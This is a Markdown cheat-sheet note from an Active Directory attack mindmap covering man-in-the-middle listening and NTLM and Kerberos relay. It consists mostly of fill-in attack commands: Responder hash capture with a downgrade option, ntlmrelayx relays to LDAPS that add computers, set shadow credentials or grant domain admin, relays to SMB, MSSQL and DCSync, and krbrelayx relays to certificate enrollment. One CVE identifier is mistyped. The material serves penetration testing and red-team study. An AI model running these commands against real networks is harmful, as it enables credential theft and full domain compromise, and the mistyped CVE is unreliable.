---
title: "Man In The Middle"
category: mitm
color: "#ffff00"
tags:
  - ad-mindmap
  - mitm
  - cve
---

# 📡 Man In The Middle

> [!info] Mindmap box `Man In The Middle (Listen and Relay)`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Listen
➡️ [[Crack Hash|Hash NTLMv1 or NTLMv2]] / [[Valid User (No Password)|Username]] / [[Valid Credentials|Credentials (ldap/http)]]

- `responder -l <interface> #use --lm to force downgrade` [↗](https://github.com/lgandx/Responder)
- `smbclient.py` [↗](https://github.com/fortra/impacket/blob/master/examples/smbclient.py)

## NTLM relay

- MS08-068 self relay `#CVE`
    - `msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008` [↗](https://docs.metasploit.com/)
- SMB -> LDAP(S)
    - NTLMv1
        - remove mic (no CVE needed) ➡️ [[Man In The Middle|see LDAP(S)]]
    - NTLMv2
        - Remove mic (CVE-2019-1040) `#CVE` ➡️ [[Man In The Middle|see LDAP(S)]]
- HTTP(S) -> LDAP(S)
    - Usually from webdav coerce ➡️ [[Man In The Middle|see LDAP(S)]]
- To LDAP(S)
    - Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)
        - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access ` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ➡️ [[Kerberos Delegation|RBCD]]
        - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ➡️ [[Lateral Movement|Shadow Credentials]]
        - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ➡️ [[Domain Admin|Domain admin]]
        - `ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ➡️ [[Lateral Movement|LDAP SHELL]]
- To SMB
    - Relay to SMB (if SMB is not signed)
        - Find SMB not signed targets (default if not a Domain controler)
            - `nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt` [↗](https://github.com/Pennyw0rth/NetExec)
        - `ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ➡️ [[Lateral Movement|SMB Socks]]
- To HTTP
    - Relay to CA web enrollement ➡️ [[ADCS|ESC8]]
    - Relay to WSUS ➡️ [[Lateral Movement|WSUS]]
- To MsSQL
    - `ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ➡️ [[Lateral Movement|MSSQL Socks]]
- SMB -> NETLOGON
    - Zero-Logon (safe method) (CVE-202-1472) `#CVE`
        - Relay one dc to another
            - `ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ➡️ [[ACLs & ACEs Permissions|DCSYNC]]

## Kerberos relay

- To HTTP
    - `krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>` [↗](https://github.com/dirkjanm/krbrelayx) ➡️ [[ADCS|ESC8]]
- SMB -> SMB
    - same as NTLM relay, use krbrelayx.py
- SMB -> LDAP(S)
    - same as NTLM relay, use krbrelayx.py
